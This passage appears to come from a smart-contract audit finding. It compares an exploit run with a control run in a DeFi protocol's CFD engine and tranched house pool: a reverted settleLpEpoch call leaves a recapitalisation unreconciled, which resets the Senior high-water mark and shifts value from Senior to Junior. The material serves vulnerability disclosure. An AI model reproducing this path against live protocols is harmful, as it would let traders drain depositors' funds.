before the recap, the recap-sized long is rejected with `CfdEngine__TypedOrderFailure(2, 4 = SKEW_TOO_HIGH, false)`. right after the recap, a keeper `settleLpEpoch` reverts `0x86cca6b8` (`HousePool__NoLpEpochProgress`), so the pending recap stays unreconciled while the recap-backed long (40_075.67 USDG notional) trades. after the 10% loss, the single deciding reconcile leaves Senior at 98_835.98 USDG, Junior at 0 and the Senior high-water mark at exactly 100_000 USDG, with no terminal deficit and no degraded mode. the control, which reconciles right after the recap, keeps the high-water mark at 190_002.74 USDG through the same loss. after identical later revenue, Senior holds 99_996.91 USDG against 106_673.77 USDG in the control, and Junior holds 5_512.84 USDG against 0.
